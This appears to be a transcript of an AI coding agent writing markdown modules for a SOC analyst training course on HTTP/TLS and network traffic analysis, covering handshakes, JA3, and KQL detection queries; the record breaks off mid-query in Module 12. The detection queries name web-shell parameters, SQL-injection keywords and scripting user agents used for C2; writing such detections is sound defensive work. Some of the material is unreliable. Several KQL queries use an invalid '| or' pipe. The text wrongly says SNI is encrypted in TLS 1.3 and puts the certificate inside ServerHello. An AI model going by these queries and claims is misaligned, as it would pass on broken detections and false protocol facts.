**Recon** |\n| **Location** | Response | Redirect target | **Open redirect, phishing** |\n\n### Security Headers (Response)\n| Header | Purpose | Secure Value |\n|--------|---------|--------------|\n| **Strict-Transport-Security (HSTS)** | Force HTTPS | `max-age=31536000; includeSubDomains; preload` |\n| **Content-Security-Policy (CSP)** | Prevent XSS/injection | `default-src 'self'; script-src 'self'...` |\n| **X-Frame-Options** | Prevent clickjacking | `DENY` or `SAMEORIGIN` |\n| **X-Content-Type-Options** | Prevent MIME sniffing | `nosniff` |\n| **Referrer-Policy** | Control referer leakage | `strict-origin-when-cross-origin` |\n| **Permissions-Policy** | Control browser features | `geolocation=(), microphone=()` |\n| **Cross-Origin-Opener-Policy (COOP)** | Isolate browsing context | `same-origin` |\n| **Cross-Origin-Resource-Policy (CORP)** | Control resource loading | `same-origin` |\n\n---\n\n## 11.2 HTTPS & TLS — Encryption in Transit\n\n### TLS Handshake (TLS 1.2)\n```\nClient                                    Server\n   │                                          │\n   ├─ ClientHello ──────────────────────────►│\n   │  • Version (TLS 1.2)                     │\n   │  • Random (32 bytes)                     │\n   │  • Session ID                            │\n   │  • Cipher Suites (priority order)        │\n   │  • Compression Methods                   │\n   │  • Extensions: SNI, ALPN, etc.           │\n   │                                          │\n   │◄─ ServerHello ──────────────────────────┤\n   │  • Version                               │\n   │  • Random                                │\n   │  • Session ID                            │\n   │  • **Cipher Suite** (selected)           │\n   │  • Compression                           │\n   │  • Extensions                            │\n   │                                          │\n   │◄─ Certificate ──────────────────────────┤\n   │  • X.509 Certificate Chain               │\n   │                                          │\n   │◄─ ServerKeyExchange (if DHE/ECDHE) ─────┤\n   │  • DH Parameters + Signature             │\n   │                                          │\n   │◄─ CertificateRequest (optional) ────────┤\n   │  • Client cert types, CAs                │\n   │                                          │\n   │◄─ ServerHelloDone ──────────────────────┤\n   │                                          │\n   ├─ ClientKeyExchange ────────────────────►│\n   │  • Pre-Master Secret (encrypted)         │\n   │                                          │\n   ├─ CertificateVerify (if client cert) ────►│\n   │                                          │\n   ├─ ChangeCipherSpec ─────────────────────►│\n   ├─ Finished (encrypted) ─────────────────►│\n   │                                          │\n   │◄─ ChangeCipherSpec ─────────────────────┤\n   │◄─ Finished (encrypted) ─────────────────┤\n   │                                          │\n   │         ENCRYPTED APPLICATION DATA       │\n```\n\n### TLS 1.3 Handshake (Simplified, Faster)\n```\nClient                                    Server\n   │                                          │\n   ├─ ClientHello ──────────────────────────►│\n   │  • Version (TLS 1.3)                     │\n   │  • Random                                │\n   │  • Cipher Suites (AEAD only)             │\n   │  • Key Shares (ECDHE)                    │\n   │  • Supported Versions                    │\n   │  • **SNI** (encrypted in 1.3!)           │\n   │                                          │\n   │◄─ ServerHello ──────────────────────────┤\n   │  • Key Share                             │\n   │  • Certificate (encrypted!)              │\n   │  • CertificateVerify                     │\n   │  • Finished                              │\n   │                                          │\n   ├─ Finished ─────────────────────────────►│\n   │                                          │\n   │         ENCRYPTED APPLICATION DATA       │\n```\n\n**Key TLS 1.3 Changes**: \n- 1-RTT handshake (vs 2-RTT in 1.2)\n- Encrypted Server Certificate (privacy)\n- Removed weak ciphers (RSA key exchange, CBC, RC4, SHA1)\n- Only AEAD ciphers (AES-GCM, ChaCha20-Poly1305)\n- 0-RTT resumption (replay risk)\n\n### Cipher Suite Naming\n```\nTLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\n│       │      │       │        │      │\n│       │      │       │        │      └── PRF (HMAC-SHA384)\n│       │      │       │        └──────── Auth Encryption (AES-256-GCM)\n│       │      │       └──────────────── Bulk Encryption\n│       │      └──────────────────────── Auth (RSA cert)\n│       └────────────────────────────── Key Exchange (ECDHE)\n└───────────────────────────────────── Protocol\n```\n\n**Preferred (TLS 1.2+)**:\n- `TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384` (0xC030)\n- `TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256` (0xC02F)\n- `TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384` (0xC02C)\n\n**Deprecated/Weak**:\n- `TLS_RSA_WITH_AES_256_CBC_SHA` (no forward secrecy)\n- `TLS_RSA_WITH_RC4_128_SHA` (RC4 broken)\n- `TLS_RSA_WITH_3DES_EDE_CBC_SHA` (3DES sweet32)\n- Any with `CBC` (Lucky13, POODLE)\n- Any with `SHA` (not SHA256/384)\n\n---\n\n## 11.3 TLS Certificates — X.509\n\n### Certificate Fields\n| Field | Description |\n|-------|-------------|\n| **Version** | v3 (supports extensions) |\n| **Serial Number** | Unique per CA |\n| **Signature Algorithm** | e.g., `sha256WithRSAEncryption` |\n| **Issuer** | CA DN (CN=DigiCert TLS RSA SHA256 2020 CA1, O=DigiCert Inc, C=US) |\n| **Validity** | Not Before / Not After |\n| **Subject** | Entity DN (CN=example.com, O=Example Inc, L=City, C=US) |\n| **Subject Public Key Info** | Algorithm + Public Key |\n| **Extensions** | **Critical for security** |\n\n### Critical Extensions\n| Extension | Purpose | SOC Check |\n|-----------|---------|-----------|\n| **Subject Alternative Name (SAN)** | Additional DNS names/IPs | **Validates hostname** |\n| **Key Usage** | Key purpose | Digital Signature, Key Encipherment |\n| **Extended Key Usage (EKU)** | Specific uses | Server Auth (1.3.6.1.5.5.7.3.1), Client Auth |\n| **Basic Constraints** | CA or End-Entity | `CA:FALSE` for leaf certs |\n| **CRL Distribution Points** | Revocation check URL | |\n| **Authority Information Access (AIA)** | OCSP responder, CA issuer | |\n| **Certificate Transparency (SCT)** | CT log proof | **Required for public certs** |\n\n### Certificate Validation (Client Side)\n1. **Trust Chain**: Leaf → Intermediate(s) → Root (in OS/Browser trust store)\n2. **Signature Verification**: Each cert signed by parent's private key\n3. **Validity Period**: Now between NotBefore and NotAfter\n4. **Revocation**: CRL / OCSP (soft-fail common)\n5. **Hostname Match**: SNI/URL hostname in Subject CN or SAN\n6. **Key Usage**: Server Auth EKU present\n7. **Basic Constraints**: Not a CA (unless pathlen allows)\n\n### Certificate Types\n| Type | Validation | Use Case |\n|------|------------|----------|\n| **DV (Domain Validated)** | Email/DNS/HTTP challenge | Most websites, automation (Let's Encrypt) |\n| **OV (Organization Validated)** | Business identity verified | Corporate sites |\n| **EV (Extended Validation)** | Rigorous legal verification | Banks, high-value (green bar deprecated) |\n| **Wildcard** | `*.example.com` | Subdomains |\n| **Multi-Domain (SAN)** | Multiple names in one cert | Microservices, CDN |\n| **Self-Signed** | No CA | Internal, dev, **malware C2** |\n| **Code Signing** | Sign executables | Software distribution |\n\n---\n\n## 11.4 TLS Visibility for SOC\n\n### The Encryption Problem\n```\nWithout Decryption:                    With Decryption (SSL Inspection):\n┌─────────────────────┐                ┌─────────────────────┐\n│ Client ──────────► Server             │ Client ───► Proxy ───► Server\n│       TLS 1.2                        │       TLS 1.2   TLS 1.2\n│       🔒 Encrypted                   │       🔓 Decrypt  🔓 Decrypt\n│       ❌ No payload                  │       ✅ Full HTTP  ✅ Full HTTP\n│       ✅ JA3, SNI, Cert              │       ✅ JA3, SNI   ✅ JA3, SNI\n└─────────────────────┘                └─────────────────────┘\n```\n\n### What You CAN See Without Decryption\n| Metadata | Source | Value |\n|----------|--------|-------|\n| **SNI (Server Name Indication)** | ClientHello | Target domain (plaintext in 1.2, encrypted in 1.3 ECH) |\n| **JA3 / JA3S Fingerprint** | ClientHello / ServerHello | **Client/Server TLS fingerprint** (identify tools, malware) |\n| **Certificate** | Server Certificate | Subject, Issuer, SAN, Validity, Public Key, Extensions |\n| **Cipher Suite** | ServerHello | Negotiated encryption (weak/strong) |\n| **TLS Version** | ClientHello/ServerHello | 1.0/1.1/1.2/1.3 |\n| **ALPN** | ClientHello | Application protocol (h2, http/1.1) |\n| **Flow Metadata** | NetFlow/Zeek | Volume, duration, timing, direction |\n\n### JA3 / JA3S — TLS Fingerprinting\n**JA3 (Client)**: MD5 of concatenated ClientHello fields:\n```\nTLS Version, Cipher Suites, Extensions, Elliptic Curves, Elliptic Curve Formats\nExample: 771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-51-57-47-53-255,0-11-10-35-16-5-13-18-51-45-43-27-21,29-23-24,0\n→ JA3: ae4edc6faf64d08308082ad26be60767  (Chrome)\n```\n\n**JA3S (Server)**: Same for ServerHello.\n\n**Use Cases**:\n- Identify malware (Cobalt Strike, Meterpreter, custom tools)\n- Detect anomalous clients (scripts, scanners)\n- Cluster C2 infrastructure\n- Bypass User-Agent spoofing\n\n---\n\n## 11.5 Proxy Logs — SOC Gold Mine\n\n### Common Proxy Log Format (Squid/BlueCoat/Zscaler)\n```\ntimestamp  client_ip  username  auth_method  request_method  request_url  response_code  response_size  mime_type  referer  user_agent  category  action  threat_score\n```\n\n### Key Fields for Investigation\n| Field | Value |\n|-------|-------|\n| **timestamp** | UTC, microsecond precision |\n| **client_ip** | Source (pre-NAT or post-NAT) |\n| **username** | Authenticated user (AD/SAML) |\n| **request_method** | GET, POST, CONNECT, etc. |\n| **request_url** | Full URL (path + query) |\n| **response_code** | HTTP status |\n| **response_size** | Bytes returned |\n| **mime_type** | Content-Type |\n| **referer** | Previous page |\n| **user_agent** | Client software |\n| **category** | URL categorization (Malware, Phishing, Social Media, etc.) |\n| **action** | ALLOW, BLOCK, MONITOR, SCAN |\n| **threat_score** | Vendor risk score (0-100) |\n| **dlp_trigger** | Data loss prevention match |\n| **sandbox_verdict** | File sandbox result |\n\n---\n\n## 11.6 HTTP/HTTPS Attack Patterns — Detection\n\n### 1. Web Shell Detection\n```kql\nProxyLogs\n| where cs_method in (\"POST\", \"PUT\")\n| where cs_uri_stem has_any (\".php\", \".jsp\", \".asp\", \".aspx\", \".cfm\", \".pl\", \".py\")\n| where cs_uri_query has_any (\"cmd=\", \"exec=\", \"shell=\", \"system=\", \"passthru=\", \"eval(\", \"assert(\")\n| summarize Count=count(), Commands=make_set(cs_uri_query) by c_ip, cs_host, cs_uri_stem, bin(TimeGenerated, 1h)\n| where Count > 5\n```\n\n### 2. SQL Injection in URL/Body\n```kql\nProxyLogs\n| where cs_uri_query has_any (\"'\", \"\\\"\", \"UNION\", \"SELECT\", \"INSERT\", \"UPDATE\", \"DELETE\", \"DROP\", \"OR 1=1\", \"'--\", \"';--\")\n| or cs_uri_query matches regex @\"(%27|%22|%3B|%2D%2D|%55%4E%49%4F%4E)\"\n| summarize Count=count(), Payloads=make_set(cs_uri_query) by c_ip, cs_host, bin(TimeGenerated, 1h)\n```\n\n### 3. C2 over HTTP/HTTPS\n```kql\nProxyLogs\n| where cs_method in (\"GET\", \"POST\")\n| where cs_useragent has_any (\"python-requests\", \"curl\", \"Wget\", \"Go-http-client\", \"axios\", \"okhttp\")\n| where cs_uri_stem matches regex @\"(/api/|/v1/|/v2/|/cmd|/task|/beacon|/heartbeat)\"\n| summarize Count=count(), UAs=make_set(cs_useragent), URIs=make_set(cs_uri_stem) by c_ip, cs_host, bin(TimeGenerated, 1h)\n| where Count > 20\n```\n\n### 4. Data Exfiltration (Large Uploads)\n```kql\nProxyLogs\n| where cs_method in (\"POST\", \"PUT\")\n| where sc_bytes > 10485760  // > 10MB response (download)\n| or cs_bytes > 10485760     // > 10MB request (upload)\n| where cs_host !in (\"known-cdn.com\", \"office365.com\", \"googleapis.com\")\n| summarize TotalUp=sum(cs_bytes), TotalDown=sum(sc_bytes), Count=count() by c_ip, cs_host, username, bin(TimeGenerated, 1h)\n| where TotalUp > 52428800  // > 50MB uploaded in hour\n```\n\n### 5. Credential Phishing / Stuffing\n```kql\nProxyLogs\n| where cs_uri_stem has_any (\"/login\", \"/signin\", \"/auth\", \"/wp-login\", \"/admin\")\n| where cs_method == \"POST\"\n| where sc_status in (200, 302, 401, 403)\n| summarize Attempts=count(), Success=countif(sc_status in (200, 302)), Failures=countif(sc_status in (401, 403)) \n  by c_ip, cs_host, username, bin(TimeGenerated, 5m)\n| where Attempts > 20 or (Failures > 10 and Success == 0)\n```\n\n---\n\n## 11.7 Interview Questions for This Module\n\n1. **What are the common HTTP methods and which are idempotent?**\n   - GET, HEAD, OPTIONS, PUT, DELETE are idempotent. POST, PATCH are not.\n\n2. **Explain the difference between 301, 302, 307, 308 redirects.**\n   - 301: Permanent (cache). 302: Temporary (may change method to GET). 307: Temporary (preserve method). 308: Permanent (preserve method).\n\n3. **What is the TLS 1.2 handshake flow?**\n   - ClientHello → ServerHello + Certificate + ServerKeyExchange + ServerHelloDone → ClientKeyExchange + ChangeCipherSpec + Finished → ChangeCipherSpec + Finished.\n\n4. **What are the key differences between TLS 1.2 and TLS 1.3?**\n   - 1.3: 1-RTT handshake, encrypted cert, only AEAD ciphers, removed RSA key exchange/CBC/RC4/SHA1, 0-RTT resumption, SNI encryption (ECH).\n\n5. **What is JA3 and how is it used in SOC?**\n   - TLS client fingerprint (MD5 of ClientHello parameters). Identifies tools (Cobalt Strike, browsers, scripts) regardless of User-Agent.\n\n6. **What certificate extensions are critical for validation?**\n   - SAN (hostname), Key Usage (Digital Signature, Key Encipherment), EKU (Server Auth), Basic Constraints (CA:FALSE), CRL/OCSP (AIA), CT (SCT).\n\n7. **What can you see in encrypted HTTPS traffic without decryption?**\n   - SNI (1.2), JA3/JA3S, Certificate (Subject, Issuer, SAN, Validity), Cipher Suite, TLS Version, ALPN, Flow metadata (volume, timing).\n\n7. **What headers indicate a potential web shell?**\n   - POST to script extensions (.php, .jsp, .asp) with query params like `cmd=`, `exec=`, `shell=`, or suspicious User-Agents (python, curl, Go).\n\n8. **How do you detect credential stuffing in proxy logs?**\n   - High volume POSTs to login endpoints from single IP, mix of 401/403 failures with occasional 200/302 success, anomalous User-Agents.\n\n9. **What is the CONNECT method used for?**\n   - HTTPS proxy tunneling. Establishes TCP tunnel through proxy for encrypted traffic.\n\n10. **What security headers should be present in HTTP responses?**\n    - HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, COOP, CORP.\n\n---\n\n## 11.8 Study Checklist for Module 11\n\n- [ ] List HTTP methods, idempotency, body allowance\n- [ ] Recite status codes by category (1xx-5xx) with SOC relevance\n- [ ] Identify critical request/response headers\n- [ ] Draw TLS 1.2 and 1.3 handshake flows\n- [ ] Parse cipher suite names\n- [ ] Explain X.509 certificate fields and extensions\n- [ ] Describe certificate validation chain\n- [ ] List visible TLS metadata without decryption\n- [ ] Calculate/interpret JA3 fingerprints\n- [ ] Write KQL for: Web shell, SQLi, C2, Exfil, Credential stuffing\n- [ ] Answer all 10 interview questions without notes\n\n---\n\n*Next: Module 12 — Network Traffic Analysis*",
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/11-http-https-tls.md"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 22.2s)

_Thinking:_

Good, Module 11 is done. Now let me continue with Module 12 - Network Traffic Analysis.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "in_progress"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "in_progress",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 128.6s)

_Thinking:_

Now I'll create Module 12 - Network Traffic Analysis.

**Tool: write**

**Input:**
```json
{
  "content": "# Module 12: Network Traffic Analysis\n\n**Priority: P1 — L1 must read PCAP, analyze flows, identify anomalies. Foundation for NDR/EDR correlation.**\n\n---\n\n## 12.1 Network Flow Analysis — The 5-Tuple\n\n### Flow Definition (NetFlow/IPFIX/sFlow)\n```\nA \"Flow\" = Unidirectional sequence of packets sharing:\n├── Source IP\n├── Destination IP\n├── Source Port\n├── Destination Port\n└── Protocol (TCP=6, UDP=17, ICMP=1, etc.)\n```\n\n### Bidirectional Flow (Session)\n```\nTwo unidirectional flows (forward + reverse) = One session\nClient (10.10.20.5:54321) ──► Server (192.168.1.10:443)  [Forward]\nServer (192.168.1.10:443) ──► Client (10.10.20.5:54321)  [Reverse]\n```\n\n### Key Flow Metrics\n| Metric | Description | Anomaly Indicator |\n|--------|-------------|-------------------|\n| **Duration** | First packet → Last packet | Very short (scan) or very long (C2, VPN) |\n| **Packets (Total)** | Count in each direction | Asymmetric (data exfil, C2) |\n| **Bytes (Total)** | Volume in each direction | Large outbound (exfil), large inbound (download) |\n| **Packets/sec** | Rate | Constant low rate (beaconing), burst (exfil) |\n| **Bytes/packet** | Average packet size | Small (C2, interactive), Large (file transfer) |\n| **TCP Flags (OR'd)** | SYN, FIN, RST, PSH, ACK, URG | SYN only (scan), RST (blocked), FIN (clean close) |\n| **First/Last Packet Time** | Absolute timestamps | Off-hours activity |\n\n---\n\n## 12.2 Beaconing Detection — C2 Heartbeat\n\n### What is Beaconing?\nRegular, periodic communication between compromised host and C2 server. \"Heartbeat\" to receive commands.\n\n### Beaconing Characteristics\n| Characteristic | Normal Traffic | Beaconing |\n|----------------|----------------|-----------|\n| **Interval** | Variable, bursty | **Constant (jitter ±10-20%)** |\n| **Duration** | Session-based | **Long-running (hours/days)** |\n| **Packet Size** | Variable | **Consistent (small, ~100-500 bytes)** |\n| **Direction** | Request/Response | **Outbound-initiated, regular** |\n| **Destination** | Many (CDN, APIs) | **Single/few IPs/domains** |\n| **Protocol** | HTTPS, DNS, etc. | **Often HTTPS, DNS, custom TCP** |\n\n### Detection Methods\n\n#### 1. Statistical (Time Series)\n```kql\n// Regular interval detection\nFlows\n| where Protocol == \"TCP\" and DestinationPort in (80, 443, 8080, 8443)\n| summarize Count=count(), \n            Intervals=make_list(TimeGenerated), \n            Destinations=make_set(DestinationIp),\n            AvgBytes=avg(TotalBytes)\n  by SourceIp, DestinationIp, DestinationPort, bin(TimeGenerated, 1h)\n| where Count >= 12  // At least 12 connections/hour\n| mv-expand Intervals\n| order by SourceIp, Intervals asc\n| extend PrevInterval = prev(Intervals)\n| extend Delta = Intervals - PrevInterval\n| summarize AvgDelta=avg(Delta), StdDev=stdev(Delta), MinDelta=min(Delta), MaxDelta=max(Delta) \n  by SourceIp, DestinationIp, DestinationPort\n| where StdDev < AvgDelta * 0.2  // Low jitter (< 20%)\n| where AvgDelta between (30s .. 3600s)  // Reasonable beacon interval\n```\n\n#### 2. Frequency Analysis (FFT/Periodogram)\n- Convert connection timestamps to signal\n- Find dominant frequencies\n- Beaconing = sharp peak at beacon interval\n\n#### 3. Machine Learning (Isolation Forest, LSTM)\n- Train on normal flow patterns\n- Flag outliers in: interval regularity, byte symmetry, destination persistence\n\n### Jitter — The Evasion Technique\n```\nPerfect beacon:  Every 60.0s exactly  → EASY to detect\nJittered beacon: 60s ± 10% (54-66s)   → HARDER, but still periodic\nRandom beacon:   Exponential backoff  → HARDEST, mimics human\n```\n\n**Detection**: Look for *statistical regularity* even with jitter. Coefficient of Variation (StdDev/Mean) < 0.3 = suspicious.\n\n---\n\n## 12.3 Lateral Movement Detection\n\n### Common Lateral Protocols (Internal → Internal)\n| Protocol | Port | Tool/Technique | Flow Signature |\n|----------|------|----------------|----------------|\n| **SMB** | 445 | PsExec, WMI, Admin$, C$, IPC$ | Small commands, file ops, named pipes |\n| **RDP** | 3389 | Remote Desktop, RDP hijack | Long duration, graphical (high bytes) |\n| **WinRM** | 5985/5986 | PowerShell Remoting, Ansible | HTTP-like, short bursts |\n| **SSH** | 22 | Linux lateral, tunneling | Encrypted, interactive or scripted |\n| **RPC/DCOM** | 135 + dynamic | WMI, COM, SchTasks | Ephemeral high ports (>1024) |\n| **LDAP** | 389/636 | AD enumeration, delegation | Query bursts |\n| **Kerberos** | 88 | Pass-the-Ticket, delegation | TGT/TGS requests |\n| **MSSQL** | 1433 | xp_cmdshell, linked servers | TDS protocol |\n| **PostgreSQL** | 5432 | COPY TO PROGRAM | Query + exec |\n\n### Detection Patterns\n```kql\n// SMB Admin$ access (PsExec/lateral)\nFlows\n| where DestinationPort == 445\n| where TotalBytes < 10000  // Small command execution\n| where SourceIp != DestinationIp\n| join kind=inner (\n    // Correlate with auth logs\n    SecurityEvent\n    | where EventID == 4624 and LogonType == 3\n    | project TimeGenerated, SourceIp=IpAddress, TargetUserName\n) on SourceIp, TimeGenerated\n\n// RDP from unusual internal source\nFlows\n| where DestinationPort == 3389\n| where SourceIp in (internal_subnet)\n| where Duration > 300s  // Interactive session\n| join kind=leftanti (\n    // Known admin workstations\n    AdminWorkstations\n    | project SourceIp\n) on SourceIp\n\n// WinRM (PowerShell Remoting) lateral\nFlows\n| where DestinationPort in (5985, 5986)\n| where SourceIp != DestinationIp\n| where TotalPackets < 50  // Typical invoke-command burst\n```\n\n---\n\n## 12.4 Data Exfiltration Detection\n\n### Exfiltration Channels\n| Channel | Protocol | Detection Focus |\n|---------|----------|-----------------|\n| **HTTPS** | 443 | Large uploads to rare domains, cloud storage |\n| **DNS** | 53 | TXT/NULL records, high entropy subdomains |\n| **HTTP** | 80 | POST to uncommon destinations |\n| **FTP/SFTP** | 21/22 | Large transfers to external |\n| **Cloud APIs** | 443 | AWS S3, Azure Blob, GCS, Dropbox, Google Drive |\n| **Email** | 25/587/993 | Large attachments, auto-forward rules |\n| **ICMP** | N/A | Covert channel (oversized packets) |\n| **Custom TCP/UDP** | High ports | Non-standard, encrypted |\n\n### Volume-Based Detection\n```kql\n// Unusual outbound volume\nFlows\n| where Direction == \"Outbound\"  // Internal → External\n| where DestinationIp !in (approved_cdn, updates, cloud_providers)\n| summarize TotalBytes=sum(TotalBytes), ConnectionCount=count(), \n            UniqueDests=dcount(DestinationIp), MaxSingleFlow=max(TotalBytes)\n  by SourceIp, bin(TimeGenerated, 1h)\n| where TotalBytes > 1073741824  // > 1 GB/hour\n| or MaxSingleFlow > 104857600   // > 100 MB single flow\n\n// Cloud storage exfil (known providers)\nFlows\n| where DestinationIp in (aws_s3_ips, azure_blob_ips, gcs_ips, dropbox_ips)\n| where Direction == \"Outbound\"\n| summarize TotalBytes=sum(TotalBytes) by SourceIp, DestinationIp, bin(TimeGenerated, 1h)\n| where TotalBytes > 52428800  // > 50 MB to cloud storage\n```\n\n### Behavioral Detection\n- **User baseline**: Normal daily upload volume per user/host\n- **Peer baseline**: Compare to same department/role\n- **Time baseline**: Off-hours vs business hours\n- **Destination reputation**: Known exfil services, file sharing, paste sites\n\n---\n\n## 12.5 Scanning & Reconnaissance Detection\n\n### Port Scan Types\n| Scan Type | TCP Flags | Packets per Port | Detection |\n|-----------|-----------|------------------|-----------|\n| **SYN Scan** | SYN only | 1 | Many SYN, few SYN-ACK, many RST |\n| **Connect Scan** | Full handshake | 3+ | Many SYN, SYN-ACK, ACK, FIN |\n| **FIN/NULL/Xmas** | FIN / None / FIN+PSH+URG | 1 | RST response = closed |\n| **UDP Scan** | UDP | 1 | ICMP Port Unreachable |\n| **Idle/Zombie** | Spoofed | N/A | IP ID side channel |\n\n### Detection Queries\n```kql\n// SYN Scan (Horizontal - one source, many dest ports)\nFlows\n| where Protocol == \"TCP\" and TCPFlags == \"SYN\"\n| summarize ScannedPorts=dcount(DestinationPort), TargetCount=dcount(DestinationIp),\n            SynCount=count(), SynAckCount=countif(TCPFlags has \"SYN,ACK\")\n  by SourceIp, bin(TimeGenerated, 5m)\n| where ScannedPorts > 20 or TargetCount > 50\n| where SynCount > SynAckCount * 10  // Most SYN unanswered\n\n// Host Sweep (Vertical 